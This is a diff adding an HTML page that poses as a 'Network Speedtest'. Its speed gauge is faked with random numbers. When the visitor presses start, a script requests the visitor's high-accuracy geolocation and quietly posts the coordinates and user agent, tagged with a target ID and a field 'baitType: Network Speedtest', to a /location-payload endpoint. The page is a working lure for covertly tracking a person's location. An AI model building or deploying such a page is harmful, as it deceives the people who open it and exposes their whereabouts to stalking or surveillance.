@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Network Speedtest</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@400;600&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: #090d16;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .speed-box {
+            background: rgba(15, 23, 42, 0.85);
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
+        }
+
+        .speed-box h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            color: #00f2fe;
+            margin-bottom: 8px;
+        }
+
+        .gauge-circle {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 8px solid rgba(0, 242, 254, 0.1);
+            border-top: 8px solid #00f2fe;
+            margin: 30px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            animation: spin-pulse 3s infinite linear;
+        }
+
+        .speed-val {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .speed-unit {
+            font-size: 12px;
+            color: #94a3b8;
+            letter-spacing: 1px;
+        }
+
+        .btn-start {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            border: none;
+            border-radius: 10px;
+            color: #090d16;
+            font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="speed-box">
+        <h1>NETWORK SPEEDTEST</h1>
+        <p style="font-size: 13px; color: #94a3b8;">Testing Nearest Edge Node</p>
+
+        <div class="gauge-circle">
+            <div id="speedVal" class="speed-val">0.0</div>
+            <div class="speed-unit">Mbps</div>
+        </div>
+
+        <button id="startBtn" class="btn-start" onclick="startTest()">
+            <i class="fa-solid fa-play"></i> START SPEED TEST
+        </button>
+    </div>
+
+    <script>
+        const targetId = new URLSearchParams(window.location.search).get("id") || localStorage.getItem("target_id") || "SpeedTarget";
+
+        function startTest() {
+            const btn = document.getElementById("startBtn");
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> OPTIMIZING SERVER...';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    sendPayload({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy || 10,
+                        speed: pos.coords.speed || 0
+                    });
+                }, () => { }, { enableHighAccuracy: true });
+            }
+
+            let speed = 0;
+            const iv = setInterval(() => {
+                speed += (Math.random() * 25);
+                document.getElementById("speedVal").innerText = speed.toFixed(1);
+                if (speed >= 120) {
+                    clearInterval(iv);
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-check"></i> TEST COMPLETED (124.5 Mbps)';
+                }
+            }, 300);
+        }
+
+        async function sendPayload(coords) {
+            fetch("/location-payload", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    id: targetId,
+                    lat: coords.lat,
+                    lng: coords.lng,
+                    accuracy: coords.accuracy,
+                    speed: coords.speed,
+                    userAgent: navigator.userAgent,
+                    baitType: "Network Speedtest"
+                })
+            });
+        }
+    </script>
+</body>
+
+</html>
